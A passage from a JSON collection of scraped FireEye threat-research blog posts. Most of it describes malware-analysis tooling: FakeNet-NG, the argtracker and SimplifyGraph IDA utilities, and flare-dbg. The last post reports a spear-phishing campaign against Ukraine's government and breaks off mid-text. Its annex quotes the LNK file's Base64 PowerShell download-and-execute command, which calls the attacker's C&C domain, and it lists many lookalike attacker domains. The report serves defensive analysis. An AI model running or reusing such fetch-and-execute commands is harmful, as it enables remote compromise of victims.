packet is associated with the protocol. Figure 1 demonstrates the taste() routine for HTTP, which looks for the request method string at the beginning of the packet data. It gives an additional point if the packet is on a common HTTP port. There were several choices for how these scores were to be tabulated. It could not happen in the Diverter because of the TCP handshake. The Diverter could not sample data from data-less handshake packets, and if the Diverter completed the handshake, the connection could not easily be passed to a different socket at the Listener without disrupting the connection. Figure 1: HTTP taste() example Proxy We ultimately decided to add a proxy Listener that maintains full-duplex connections with the client and the Listener, with both sides unaware of the other. This solves the handshake problem and maintains socket autonomy at the Listener. The proxy is also easily configurable and enables new functionality. We substituted the proxy for the echo-server default Listener, which would receive traffic destined for unbound ports. The proxy peeks at the data on the socket, polls the Listeners, and creates a new connection with the Listener that returns the highest score. The echo-server always returns a score of one, so it will be chosen if no better option is detected. The analyst controls which Listeners are bound to ports and which Listeners are polled by the proxy. This means that the listeners do not have to be exposed at all; everything can be decided by the proxy. The user can set the Hidden option in the configuration file to False to ensure the Listener will be bound to the port indicated in the configuration file. Setting Hidden to True will force any packets to go through the proxy before accessing the Listener. For example, if the analyst suspects that malware is using FTP on port 80, she can ‘hide’ HTTP from catching the traffic, and let the proxy detect FTP and forward the packet to the FTP Listener. Additional configuration options exist for choosing which protocols are polled by the proxy. See Figure 2 and Figure 3 for configuration examples. Figure 2 is a basic configuration for a Listener, and Figure 3 demonstrates how the proxy is configurable for TCP and UDP. Figure 2: Listener Configuration Options Figure3: Proxy Configuration Options The proxy also handles SSL detection. Before polling the Listeners, the proxy examines the packet. If SSL is detected, the proxy “wraps” the socket in SSL using Python’s OpenSSL library. With the combination of protocol and SSL detection, each independent of the other, FakeNet-NG can now handle just about any protocol combination. The proxied SSL implementation also allows for improved packet analysis. The connection between the proxy and the Listener is not encrypted, which allows FakeNet to dump un-encrypted packets to the pcap output. This makes it easier for the analyst to examine the packet data. FakeNet continues to produce pcap output that includes packet data before and after modification by FakeNet. While this results in repetitive data, it is often useful to see the original packet along with the modification. Example Figure 4 shows verbose (-v) output from FakeNet on Windows responding to an HTTP request on port 81 from a clowncar malware variant (SHA-256 8d2dfd609bcbc94ff28116a80cf680660188ae162fc46821e65c10382a0b44dc). Malware such as clowncar use traditional protocols over non-standard ports for many reasons. FakeNet gives the malware analyst the flexibility to detect and respond to these cases automatically. Figure 4: clowncar malware using HTTP on port 81 Conclusion FLARE’s FakeNet-NG tool is a powerful network-simulation tool available for Windows and Linux. The new content-based protocol detection and SSL detection features ensure that FakeNet-NG remains the most useful tool for malware analysts. Configuration options give programmers the flexibility necessary to respond to malware using most protocols on any port. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/11/flare_ida_pro_script.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-11-16",
                    "source": "www.fireeye.com"
                },
                "text": "Intro This blog post is the next episode in the FLARE team IDA Pro Script\nseries. All scripts and plug-ins are available from our GitHub repo at https://github.com/fireeye/flare-ida . Automating the Repetitive I am a big believer in automating repetitive tasks to improve and\nsimplify reverse engineering. The task described in this blog comes up\nfrequently in malware analysis: identifying all of the arguments given\nto a function within a program. This situation may come up when trying to: Identify the size, location, and possible key used to decrypt\nencoded strings used by the malware. Identify each function\npointer used to start a new thread (i.e., the arguments to CreateThread or _ beginthreadex ). Identify static strings\nused in API functions that may be used as an indicator (i.e., named\nmutexes and events). Identify all of the functions resolved\nat runtime (i.e., all of the arguments to GetProcAddress). To assist reverse engineers who face similar obstacles we are\nreleasing a new IDA Python utility as part of our FLARE IDA script\nrelease: argtracker . This tool is not meant\nas a stand-alone plug-in, but rather as an aid to quickly write and\ndevelop your own custom analysis scripts within IDA. With argtracker , you can request all\narguments to a given function, and then analyze, decode, or emulate in\nany way you see fit. Usage Starting off with a simple example, let's consider a Gh0st variant.\nThis malware family traditionally has its own wrapper function around\nthe Win32 function _ beginthreadex to launch\nnew threads. This function typically has a function prototype shown in\nFigure 1. Figure 1: Gh0st malware MyCreateThread\nfunction prototype Suppose we’d like to quickly find all values of the lpStartAddress parameter so that we can perform\nsome automated analysis of each thread function. We can use argtracker for exactly this purpose using the code\nin Figure 2. The full source code for this example can be found in examples/argtracker_example1.py in our flare-ida GitHub repo. Figure 2: Example argtracker usage In this sample code, we start by creating a new Vivisect workspace.\nVivisect (see installation instructions at the end) is a separate\nbinary analysis framework written in Python and is used heavily by argracker . The workspace contains analysis\ninformation similar to an IDB file for IDA. Using this workspace, a\nnew ArgTracker instance is created. For each\ncode cross-reference to MyCreateThread , we\ncall tracker.getPushArgs(xref, 7) . This\nfunction takes as parameters: The location of the call instruction being analyzed: xref The number of stack arguments to\nextract: 7 An optional list of register names that contain\narguments to extract, which defaults to being empty This malware sample uses the _ cdecl calling convention where all arguments are pushed on the stack, so all\nseven arguments should be able to be recovered by argtracker . The third optional argument is\nexplained in the next example. The return from getPushArgs() is a list of\nresult dictionaries. Each dictionary contains numbered keys ranging\nfrom 1,2,..n where n is the number of stack arguments requested. In\nthe sample code in Figure 2 we obtain the lpStartAddress values by retrieving the tuple with\nkey 3, since lpStartAddress is the third\nparameter to the function we analyzed. The values in the tuple are\n( va, value) , where va is the effective address that argtracker observed the data value being passed as a parameter. The sample\nscript merely prints this information out, but real scripts would\nbegin actual analysis with these results. The reason that getPushArgs() returns a\nlist is for situations like in Figure 3, where separate code paths can\nsetup function arguments to a single call instruction. Each entry in\nthe result list contains the complete set of arguments if the\ndifferent code paths were taken. Figure 3: Multipath argtracker handling For a more complex example, suppose you have an annoying piece of\nmalware that decodes all of its strings at runtime. In this example,\nthe function that decodes the strings has the function prototype shown\nin Figure 4. The function has a non-standard calling convention, and\nwe are using IDA’s __ usercall annotation to\nallow us to specify that it takes two parameters on the stack ( inptr and tempPtr ), and\nthree arguments in registers ( outPtr in ecx , strLen in edi , and key in eax ). Note: setting a function prototype in this way is not necessary for argracker , and is merely done here for\nillustrative purposes. Figure 4: Example function prototype The examples/ argtracker_example2.py in\nour flare-ida GitHub repo shows how argtracker can be used in this situation. In this\nexample we really only care about three of these parameters: i nptr, strLen, and key .  Figure 5 shows basic initialization of the\nVivisect workspace using a helper function in the jayutils file (also in our GitHub rep). A tracker\nobject is created from the Vivisect workspace, and then we get all\ncross-references to the string decoder function ( decStringFunc ). Figure 5: Argtracker initialization Figure 6 shows the call to getPushArgs() for every reference to the decoder function. Only two arguments are\npassed on the stack so the second argument is 2. Because registers are\nused to pass parameters, we now need to use the third argument to getPushArgs() by passing in a list of\nregister names that contain arguments to extract: [ ‘eax’, ‘ecx’, ‘edi’ ]. The return value is still\na list of dictionaries whose keys are the recovered arguments. In\naddition to the stack arguments that can be accessed based on their\norder (1,2.. n), the register arguments can be recovered by using the\nregister name as the dictionary key. As in the first example, the\nresult is a tuple that contains the effective address where the\nregister was modified prior to the call instruction, and the value. Figure 6: Argtracker requesting\nparameters and processing them How it Works argtracker relies heavily upon Vivisect to\nperform additional analysis on the malware. A separate Vivisect\nworkspace (.viv file) is created to store the analysis, so you may be\nasked to specify the path to the original malware file if the script\ncannot find the file based on information stored in the IDB. Each\nfunction that contains a function call whose arguments are desired is\nemulated by Vivisect and all memory reads,  memory writes, and\nregister modifications are tracked. The script then traces backwards\nfrom the call instruction under observation, queuing separate branch\nsources as they are encountered, until either all conditions specified\nby the user are met, or the function start is reached. The Python script has been used successfully on both 32-bit x86 and\n64-bit x64 disassembly, but the 32-bit analysis has been tested much\nmore extensively. Other processor types have not been tried. One important caveat for this is that Vivisect’s emulation used by argtracker is only run at the function\nlevel. Vivisect returns fake stub data for data that is non-constant\nwithin the function, such as uninitialized global data or function\nparameters, to allow analysis to complete. You should sanity-check the\nresults of argtracker to make sure that\nthese stub values aren’t affecting the results. Installation As with our other IDA Pro plug-ins, clone the git repository at https://github.com/fireeye/flare-ida . The python directory can either be copied to the %IDADIR%\\python directory, or it can be in any\ndirectory found in your PYTHONPATH environment variable. Clone the Vivisect repository from https://github.com/vivisect/vivisect and add the package to your PYTHONPATH environment variable if you\ndon’t already have it installed. Test the installation by running the following Python commands\nwithin IDA Pro and ensure no error messages are produced: import vivisect import flare.argtracker Conclusion We hope you find argtracker as useful as\nwe do and that it speeds up your analysis. Stay tuned for more helpful\nreverse engineering code and blog posts from the FLARE Team. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/01/simplifying-graphs-in-ida.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-01-11",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction We’re proud to release a new plug-in for IDA Pro users – SimplifyGraph – to help automate creation of groups of nodes in the IDA’s disassembly graph view. Code and binaries are available from the FireEye GitHub repo . Prior to this release we submitted it in the 2017 Hex-Rays plugin contest , where it placed third overall. My personal preference is to use IDA’s graph mode when doing the majority of my reverse engineering. It provides a graphical representation of the control flow graph and gives visual cues about the structure of the current function that helps me better understand the disassembly. Graph mode is great until the function becomes complex. IDA is often forced to place adjacent nodes relatively far apart, or have edges in the graph cross and have complex paths. Using the overview graph becomes extremely difficult due to the density of nodes and edges, as seen in Figure 1. Figure 1: An annoying function IDA has a built-in mechanism to help simplify graphs: creating groups of nodes, which replaces all of the selected nodes with a new group node representative. This is done by selecting one or more nodes, right-clicking, and selecting “Group nodes”, as shown in Figure 2. Doing this manually is certainly possible, but it becomes tedious to follow edges in complex graphs and correctly select all of the relevant nodes without missing any, and without making mistakes. Figure 2: Manual group creation The SimplifyGraph IDA Pro plug-in we’re releasing is built to automate IDA’s node grouping capability. The plug-in is source-compatible with the legacy IDA SDK in 6.95, and has been ported to the new SDK for IDA 7.0. Pre-built binaries for both are available on the Releases tab for the project repository . The plug-in has several parts, which are introduced below. By combining these together it’s possible to isolate parts of a control flow graph for in-depth reverse engineering, allowing you to look at Figure 3 instead of Figure 1. Figure 3: Isolated subgraph to focus on Create Unique-Reachable (UR) Subgraph Unique-Reachable nodes are all nodes reachable in the graph from a given start node and that are not reachable from any nodes not currently in the UR set. For example, in Figure 4, all of the Unique-Reachable nodes starting at the green node are highlighted in blue. The grey node is reachable from the green node, but because it is reachable from other nodes not in the current UR set it is pruned prior to group creation. Figure 4: Example Unique Reachable selection The plug-in allows you to easily create a new group based on the UR definition. Select a node in IDA's graph view to be the start of the reachable search. Right click and select \"SimplifyGraph -> Create unique-reachable group\". The plug-in performs a graph traversal starting at this node, identifies all reachable nodes, and prunes any nodes (and their reachable nodes) that have predecessor nodes not in the current set. It then prompts you for the node text to appear in the new group node. If you select more than one node (by holding the Ctrl key when selecting nodes) for the UR algorithm, each additional node acts as a sentry node. Sentry nodes will not be included in the new group, and they halt the graph traversal when searching for reachable nodes. For example, in Figure 5, selecting the green node first treats it as the starting node, and selecting the red node second treats it as a sentry node. Running the “Create unique-reachable group” plug-in option creates a new group made of the green node and all blue nodes. This can be useful when you are done analyzing a subset of the current graph, and wish to hide the details behind a group node so you can concentrate on the rest of the graph. Figure 5: Unique reachable with sentry The UR algorithm operates on the currently visible graph, meaning that you can run the UR algorithm repeatedly and nest groups. Switch Case Groups Creation Switch statements implemented as jump tables appear in the graph as nodes with a large fan-out, as shown in Figure 6. The SimplifyGraph plug-in detects when the currently selected node has more than two successor nodes and adds a right-click menu option “SimplifyGraph -> Create switch case subgraphs”. Selecting this runs the Unique-Reachable algorithm on each separate case branch and automatically uses IDA’s branch label as the group node text. Figure 6: Switch jumptable use Figure 7 shows a before and after graph overview of the same function when the switch-case grouping is run. Figure 7: Before and after of switch statement groupings Isolated Subgraphs Running Edit -> Plugins -> SimplifyGraph brings up a new chooser named \"SimplifyGraph - Isolated subgraphs\" that begins showing what I call isolated subgraphs of the current graph, as seen in Figure 8. Figure 8: Example isolated subgraphs chooser A full definition appears later in the appendix including how these are calculated, but the gist is that an isolated subgraph in a directed graph is a subset of nodes and edges such that there is a single entrance node, a single exit node, and none of the nodes (other than the subgraph entry node) is reachable by nodes not in the subgraph. Finding isolated subgraphs was originally researched to help automatically identify inline functions. It does this, but it turns out that this graph construct occurs naturally in code without inline functions. This isn’t a bad thing as it shows a natural grouping of nodes that could be a good candidate to group to help simplify the overall graph and make analysis easier. Once the chooser is active, you can double click (or press Enter) on a row in the chooser to highlight the nodes that make up the subgraph, as seen in Figure 9. Figure 9: Highlighted isolated subgraph You can create a group for an isolated subgraph by: Right-clicking on the chooser row and selecting \"Create group\", or pressing Insert while a row is selected. Right-clicking in a highlighted isolated subgraph node and selecting \"SimplifyGraph -> Create isolated subgraph\". Doing either of these prompts you for text for the new graph node to create. If you manually create/delete groups using IDA you may need to refresh the chooser's knowledge of the current function groups (right-click and select \"Refresh groups\" in the chooser). You can right click in the chooser and select \"Clear highlights\" to remove the current highlights. As you navigate to new functions the chooser updates to show isolated subgraphs in the current function. Closing the chooser removes any active highlights. Any custom colors you applied prior to running the plug-in are preserved and reapplied when the current highlights are removed. Isolated subgraph calculations operates on the original control flow graph, so isolated subgroups can't be nested. As you create groups, rows in the chooser turn red indicating a group already exists, or can't be created because there is an overlap with an existing group. Another note: this calculation does not currently work on functions that do not return (those with an infinite loop). See the Appendix for details. Graph Complement Creating groups to simplify the overall control flow graph is nice, but it doesn’t help understand the details of a group that you create. To assist with this, the last feature of the plug-in hides everything but the group you’re interested in allowing you to focus on your reverse engineering. Right clicking on a collapsed group node, or a node that that belongs to an uncollapsed group (as highlighted by IDA in yellow), brings up the plug-in option “Complement & expand group” and “Complement group”, respectively. When this runs the plug-in creates a group of all nodes other than the group you’re interested in. This has the effect of hiding all graph nodes that you aren’t currently examining and allows you to better focus on analysis of the current group. As you can see, we’re abusing group creation a bit so that we can avoid creating a custom graph viewer, and instead stay within the built-in IDA graph disassembly view which allows us to continue to markup the disassembly as you’re used to. Complementing the graph gives you the view seen in Figure 10, where the entire graph is grouped into a node named “Complement of group X”. When you’re done analyzing the current group, right click on the complement node and select IDA’s “Ungroup nodes” command. Figure 10: Group complement Example Workflow As an example that exercises the plug-in, let’s revisit the function in Figure 1. This is a large command-and-control dispatch function for a piece of malware. It contains a large if-else-if series of inlined strcmp comparisons that branch to the logic for each command when the input string matches the expected command. Find all of the inline strcmp’s and create groups for those. Run Edit -> Plugins -> SimplifyGraph to bring up the plug-in chooser. In this function nearly every isolated subgraph is a 7-node inlined strcmp implementation. Go through in the chooser to verify, and create a group. This results in a graph similar to Figure 11. Figure 11: Grouped strcmp When an input string matches a command string, the malware branches to code that implements the command. To further simplify the graph and make analysis easier, run the Unique-Reachable algorithm on each separate command by right clicking on the first node after each string-comparison and selecting SimplifyGraph -> Create unique-reachable group. After this we now have a graph as in Figure 12. Figure 12: Grouped command logic Now perform your reverse engineering on each separate branch in the dispatch function. For each command handler group node that we created, right click that node and select “SimplifyGraph -> Complement & expand group”. A result of complementing a single command handler node is shown in Figure 13, which is much easier to analyze. Figure 13: Group complement When done analyzing the current command handler, delete the complement group by right clicking the “Complement of group X” node and use IDA’s built-in “Ungroup nodes” command. Repeat for the remaining command handler grouped nodes. Config You can tweak some of the configuration by entering data in a file named %IDAUSR%/SimplifyGraph.cfg, where %IDAUSR% is typically %APPDATA%/Hex-Rays/IDA Pro/ unless explicitly set to something else. All of the config applies to the isolated subgraph component. Options: * SUBGRAPH_HIGHLIGHT_COLOR: Default 0xb3ffb3: The color to apply to nodes when you double click/press enter in the chooser to show nodes that make up the currently selected isolated subgraph. Not everyone agrees that my IDA color scheme is best, so you can set your own highlight color here. * MINIMUM_SUBGRAPH_NODE_COUNT: Default 3: The minimum number of nodes for a valid isolated subgraph. If a discovered subgraph has fewer nodes than this number it is not included in the shown list. This prevents trivial two-node subgraphs from being shown. * MAXIMUM_SUBGRAPH_NODE_PERCENTAGE: Default 95: The maximum percent of group nodes (100.0 *(subgroup_node_count / total_function_node_count)) allowed. This filters out isolated subgraphs that make up (nearly) the entire function, which are typically not interesting. Example SimplifyGraph.cfg contents ``` \"MINIMUM_SUBGRAPH_NODE_COUNT\"=5 \"MAXIMUM_SUBGRAPH_NODE_PERCENTAGE\"=75 \"SUBGRAPH_HIGHLIGHT_COLOR\"=0x00aa1111 ``` Prior work: I came across semi-related work while working on this: GraphSlick from the 2014 Hex-Rays contest . That plug-in had different goals to automatically identifying (nearly) identical inline functions via CFG and basic block analysis, and patching the program to force mock function calls to the explicit function. It had a separate viewer to present information to the user. SimplifyGraph is focused on automating tasks when doing manual reverse engineering (group creation) to reduce the complexity of disassembly in graph mode. Future work may incorporate the same prime-products calculations to help automatically identify isolated subgraphs. Installation Prebuilt Windows binaries are available from the Releases tab of the GitHub project page . The ZIP files contain both IDA 32 and IDA 64 plug-ins for each of the new IDA 7.0 SDK and for the legacy IDA 6.95 SDK. Copy the two plug-ins for your version of IDA to the %IDADIR%\\plugins directory. Building This plug-in & related files were built using Visual Studio 2013 Update 5. Environment Variables Referenced by project: * IDASDK695: path to the extracted IDA 6.95 SDK. This should have `include` and `lib` paths beneath it. * IDASDK: path to the extracted IDA 7.0 (or newer) SDK. This Should have `include` and `lib` paths beneath it. * BOOSTDIR: path to the extracted Boost library. Should have `boost` and `libs` paths beneath it. The easiest way is to use the Microsoft command-line build tools: * For IDA7.0: Launch VS2013 x64 Native Tools Command Prompt, then run: ``` msbuild SimplifyGraph.sln /property:Configuration=ReleaseIDA70_32 /property:Platform=x64 msbuild SimplifyGraph.sln /property:Configuration=ReleaseIDA70_64 /property:Platform=x64 ``` * For IDA6.95: Launch VS2013 x86 Native Tools Command Prompt, then run: ``` msbuild SimplifyGraph.sln /property:Configuration=ReleaseIDA695_32 /property:Platform=Win32 msbuild SimplifyGraph.sln /property:Configuration=ReleaseIDA695_64 /property:Platform=Win32 ``` Conclusion I hope this blog has shown the power of automatically grouping nodes within a disassembly graph view, and viewing these groups in isolation to help with your analysis. This plug-in has become a staple of my workflow, and we’re releasing it to the community with the hope that others find it useful as well. Appendix: Isolated Subgraphs Finding isolated subgraphs relies on calculating the immediate dominator and immediate post-dominator trees for a given function graph. A node d dominates n if every path to n must go through d. The immediate dominator p of node n is basically the closest dominator to n, where there is no node t where p dominates t, and t dominates n. A node z post-dominates a node n if every path from n to the exit node must go through z. The immediate post-dominator x of node n is the closest post-dominator, where there is no node t where t post-dominates n and x post-dominates t. The immediate dominator relationship forms a tree of nodes, where every node has an immediate dominator other than the entry node. The Lengauer-Tarjan algorithm can efficiently calculate the immediate dominator tree of a graph. It can also calculate the immediate post-dominator tree by reversing the direction of each edge in the same graph. The plug-in calculates the immediate dominator tree and immediate post-dominator tree of the function control flow graph and looks for the situations where the (idom[i] == j) and (ipdom[j] == i). This means all paths from the function start to node i must go through node j, and all paths from j to the function terminal must go through i. A candidate isolated subgraph thus starts at node j and ends at node i. For each candidate isolated subgraph, the plug-in further verifies only the entry node has predecessor nodes not in the candidate subgraph. The plug-in also filters out candidate subgraphs by making sure they have a minimum node count and cover a maximum percentage of nodes (see MINIMUM_SUBGRAPH_NODE_COUNT and MAXIMUM_SUBGRAPH_NODE_PERCENTAGE in the config section). One complication is that functions often have more than one terminal node – programmers can arbitrarily return from the current function at any point. The immediate post-dominator tree is calculated for every terminal node, and any inconsistencies are marked as indeterminate and are not possible candidates for use. Functions with infinite loops do not have terminal nodes, and are not currently handled. For a simple example, consider the graph in Figure 14. It has the following immediate dominator and post-dominator trees: Figure 14: Example graph Node idom 0 None 1 0 2 1 3 1 4 3 5 3 6 3 7 6 8 0 Node ipdom 0 8 1 3 2 3 3 6 4 6 5 6 6 7 7 8 8 None Looking for pairs of (idom[i] == j) and (ipdom[j] == i) gives the following: (0, 8) (1, 3) (3, 6) (6,7) (0, 8) is filtered because it makes up all of the nodes of the graph. (1,3) and (6, 7) are filtered out because they contain nodes reachable from nodes not in the set: for (1, 3) node 2 is reachable from node 6, and for (6, 7) node 2 is reachable from node 1. This leaves (3, 6) as the only isolate subgraph in this example, shown in Figure 15. Figure 15: Example graph with isolated subgraph Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/12/flare_script_series.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-12-28",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction We are expanding our script series beyond IDA Pro. This post extends the FireEye Labs Advanced Reverse Engineering (FLARE) script series to an invaluable tool for the reverse engineer – the debugger. Just like IDA Pro, debuggers have scripting interfaces. For example, OllyDbg uses an asm-like scripting language, the Immunity debugger contains a Python interface, and Windbg has its own language. Each of these options isn’t ideal for rapidly creating string decoding debugger scripts. Both Immunity and OllyDbg only support 32-bit applications, and Windbg’s scripting language is specific to Windbg and, therefore, not as well-known. The pykd project was created to interface between Python and Windbg to allow debugger scripts to be written in Python. Because malware reverse engineers love Python, we built our debugger scripting library on top of pykd for Windbg. Here we release a library we call flare-dbg . This library provides several utility classes and functions to rapidly develop scripts to automate debugging tasks within Windbg. Stay tuned for future blog posts that will describe additional uses for debugger scripts! String Decoding Malware authors like to hide the intent of their software by obfuscating their strings. Quickly deobfuscating strings allows you to quickly figure out what the malware is doing. As stated in Practical Malware Analysis, there are generally two approaches to deobfuscating strings: self-decoding and manual programming. The self-decoding approach allows the malware to decode its own strings. Manual programming requires the reverse engineer to reprogram the decoding function logic. A subset of the self-decoding approach is emulation, where each assembly instruction execution is emulated. Unfortunately, library call emulation is required, and emulating every library call is difficult and may cause inaccurate results. In contrast, a debugger is attached to the actual running process, so all the library functions can be run without issue. Each of these approaches has their place, but this post teaches a way to use debugger scripting to automatically self-decode all obfuscated strings. Challenge To decode all obfsucated strings, we need to find the following: the string decoder function, each time it is called, and all arguments to each of those instances. We then need to run the function and read out the result. The challenge is to do this in a semi-automated way. Approach The first task is to find the string decoder function and get a basic understanding of the inputs and outputs of the function. The next task is to identify each time the string decoder function is called and all of the arguments to each call. Without using IDA, a handy Python project for binary analysis is Vivisect . Vivisect contains several heuristics for identifying functions and cross-references. Additionally, Vivisect can emulate and disassemble a series of opcodes, which can help us identify function arguments. If you haven’t already, be sure to check out the FLARE scripting series post on tracking function arguments using emulation , which also uses Vivisect. Introducing flare-dbg The FLARE team is introducing a Python project, flare-dbg that runs on top of pykd. Its goal is to make Windbg scripting easy. The heart of the flare-dbg project lies in the DebugUtils class, which contains several functions to handle: ·      Memory and register manipulation ·      Stack operations ·      Debugger execution ·      Breakpoints ·      Function calling In addition to the basic debugger utility functions, the DebugUtils class uses Vivisect to handle the binary analysis portion. Example I wrote a simple piece of malware that hides strings by encoding them. Figure 1 shows an HTTP User-Agent string being decoded by a function I named string_decoder. Figure 1: String decoder function reference in IDA Pro After a cursory look at the string_decoder function, the arguments are identified as an offset to an encoded string of bytes, an output address, and a length. The function can be described as the following C prototype: Now that we have a basic understanding of the string_decoder function, we test decoding using Windbg and flare-dbg. We begin by starting the process with Windbg and executing until the program’s entry point. Next, we start a Python interactive shell within Windbg using pykd and import flaredbg. Next, we create a DebugUtils object, which contains the functions we need to control the debugger. We then allocate 0x3A-bytes of memory for the output string. We use the newly allocated memory as the second parameter and setup the remainder of the arguments. Finally, we call the string_decoder function at virtual address 0x401000, and read the output string buffer. After proving we can decode a string with flare-dbg , let’s automate all calls to the string_decoder function. An example debugger script is shown in Figure 2. The full script is available in the examples directory in the github repository. Figure 2. Example basic debugger script Let’s break this script down. First, we identify the function virtual address of the string decoder function and create a DebugUtils object. Next, we use the DebugUtils function get_call_list to find the three push arguments for each time string_decoder is called. Once the call_list is generated, we iterate all calling addresses and associated arguments. In this example, the output string is decoded to the stack. Because we are only executing the string decoder function and won’t have the same stack setup as the malware, we must allocate memory for the output string. We use the third parameter, the length, to specify the size of the memory allocation. Once we allocate memory for the output string, we set the newly allocated memory address as the second parameter to receive the output bytes. Finally, we run the string_decoder function by using the DebugUtils call function and read the result from our allocated buffer. The call function sets up the stack, sets any specified register values, and executes the function. Once all strings are decoded, the final step is to get these strings back into our IDB. The utils script contains utility functions to create IDA Python scripts. In this case, we output an IDA Python script that creates comments in the IDB. Running this debugger script produces the following output: The output IDA Python script creates repeatable comments on all encoded string locations, as shown in Figure 3. Figure 3. Decoded string as comment Conclusion Stay tuned for another debugger scripting series post that will focus on plugins! For now, head over to the flare-dbg github project page to get started. The project requires pykd , winappdbg , and vivisect . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/04/spear-phishing-campaign-targets-ukraine-government.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-04-16",
                    "source": "www.fireeye.com"
                },
                "text": "In early 2019, FireEye Threat Intelligence identified a spear phishing email targeting government entities in Ukraine. The spear phishing email included a malicious LNK file with PowerShell script to download the second-stage payload from the command and control (C&C) server. The email was received by military departments in Ukraine and included lure content related to the sale of demining machines. This latest activity is a continuation of spear phishing that targeted the Ukrainian Government as early as 2014. The email is linked to activity that previously targeted the Ukrainian Government with RATVERMIN. Infrastructure analysis indicates the actors behind the intrusion activity may be associated with the so-called Luhansk People's Republic (LPR). The spear phishing email, sent on Jan. 22, 2019, used the subject \"SPEC-20T-MK2-000-ISS-4.10-09-2018-STANDARD,\" and the sender was forged as Armtrac, a defense manufacturer in the United Kingdom (Figure 1). Figure 1: The spear phishing email The email included an attachment with the filename \"Armtrac-Commercial.7z\" (MD5: 982565e80981ce13c48e0147fb271fe5). This 7z package contained \"Armtrac-Commercial.zip\" (MD5: e92d01d9b1a783a23477e182914b2454) with two benign Armtrac documents and one malicious LNK file with a substituted icon (Figure 2). Figure 2: LNK with substituted icon Armtrac-20T-with-Equipment-35078.pdf (MD5: 0d6a46eb0d0148aafb34e287fcafa68f) is a benign document from the official Armtrac website. SPEC-20T-MK2-000-ISS-4.10-09-2018-STANDARD.pdf (MD5: bace12f3be3d825c6339247f4bd73115) is a benign document from the official Armtrac website. SPEC-10T-MK2-000-ISS-4.10-09-2018-STANDARD.pdf.lnk (MD5: ec0fb9d17ec77ad05f9a69879327e2f9) is a malicious LNK file that executes a PowerShell script. Interestingly, while the LNK file used a forged extension to impersonate a PDF document, the icon was replaced with a Microsoft Word document icon. Sponsor Potentially Active Since 2014 Compilation times indicate that this actor, who focused primarily on Ukraine, may have been active since at least 2014. Their activity was first reported by FireEye Threat Intelligence in early 2018. They gradually increased in sophistication and leveraged both custom and open-source malware. The 2018 campaign used standalone EXE or self-extracting RAR (SFX) files to infect victims. However, their recent activity showed increased sophistication by leveraging malicious LNK files. The group used open-source QUASARRAT and the RATVERMIN malware, which we have not seen used by any other groups. Domain resolutions and malware compile times suggest this group may have been active as early as 2014. Filenames and malware distribution data suggest the group is primarily focused on targeting Ukrainian entities. Association With So-Called Luhansk People's Republic FireEye Threat Intelligence analysis uncovered several indications that the actors behind this activity have ties to the breakaway so-called Luhansk People's Republic (LPR). Registrant Overlap with Official So-Called LPR Website Infrastructure analysis suggests these operators are linked to the so-called LPR and the persona \"re2a1er1.\" The domain used as C&C by the previous LNK file (sinoptik[.]website) was registered under the email \"re2a1er1@yandex.ru.\" The email address also registered the following domains. Domains Registered by re2a1er1@yandex.ru Possible Mimicked Domains Description Possible Targeted Country 24ua[.]website 24tv.ua A large news portal in Ukraine UA censor[.]website censor.net.ua A large news portal in Ukraine UA fakty[.]website fakty.ua A large news portal in Ukraine UA groysman[.]host Volodymyr Borysovych Groysman V. B. Groysman is a politician who has been the Prime Minister of Ukraine since April 14, 2016 UA gordon.co[.]ua gordonua.com A large mail service in Ukraine UA mailukr[.]net ukr.net A large news portal in Ukraine UA me.co[.]ua me.gov.ua Ukraine's Ministry of Economic Development and Trade UA novaposhta[.]website novaposhta.ua Ukraine's largest logistics services company UA olx[.]website olx.ua Ukraine's largest online ad platform UA onlineua[.]website online.ua A large news portal in Ukraine UA rst[.]website rst.ua One of the largest car sales websites in Ukraine UA satv[.]pw Unknown TV-related UA sinoptik[.]website sinoptik.ua The largest weather website in Ukraine UA spectator[.]website spectator.co.uk A large news portal in the UK UK tv.co[.]ua Unknown TV-related UA uatoday[.]website uatoday.news A large news portal in Ukraine UA ukrposhta[.]website ukrposhta.ua State Post of Ukraine UA unian[.]pw unian.net A large news portal in Ukraine Unknown vj2[.]pw Unknown Unknown UA xn--90adzbis.xn--c1avg Not Applicable Punycode of Ministry of State Security of the So-Called Luhansk People’s Republic’s website UA z1k[.]pw zik.ua A large news portal in Ukraine UA milnews[.]info Unknown Military news UA Table 1: Related infrastructure One of the domains, \"xn--90adzbis.xn--c1avg\" is a Punycode of \"мгблнр.орг,\" which is the official website of the Ministry of State Security of the So-Called LPR (Figure 3). Ukraine legislation describes so-called LPR as \"temporarily occupied territory\" and its government as an \"occupying administration of the Russian Federation.\" Figure 3: Official website of the Ministry of State Security of the So-Called Luhansk People's Republic (МГБ ЛНР - Министерство Государственной Безопасности Луганской Народной Республики) Conclusions This actor has likely been active since at least 2014, and its continuous targeting of the Ukrainian Government suggests a cyber espionage motivation. This is supported by the ties to the so-called LPR's security service. While more evidence is needed for definitive attribution, this activity showcases the accessibility of competent cyber espionage capabilities, even to sub-state actors. While this specific group is primarily a threat to Ukraine, nascent threats to Ukraine have previously become international concerns and bear monitoring. Technical Annex The LNK file (SPEC-10T-MK2-000-ISS-4.10-09-2018-STANDARD.pdf.lnk [MD5: ec0fb9d17ec77ad05f9a69879327e2f9]) included the following script (Figure 4) to execute a PowerShell script with Base64-encoded script: vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -e \"\"\"\"aQBlAHgAKABpAHcAcgAgAC0AdQBzAGUAYgAgAGgAdAB0AHAAOgAvAC8AcwBpAG4Ab wBwAH QAaQBrAC4AdwBlAGIAcwBpAHQAZQAvAEUAdQBjAHoAUwBjACkAIAA=\"\"\"\"\"\", 0 : window.close\") Figure 4: LNK file script The following 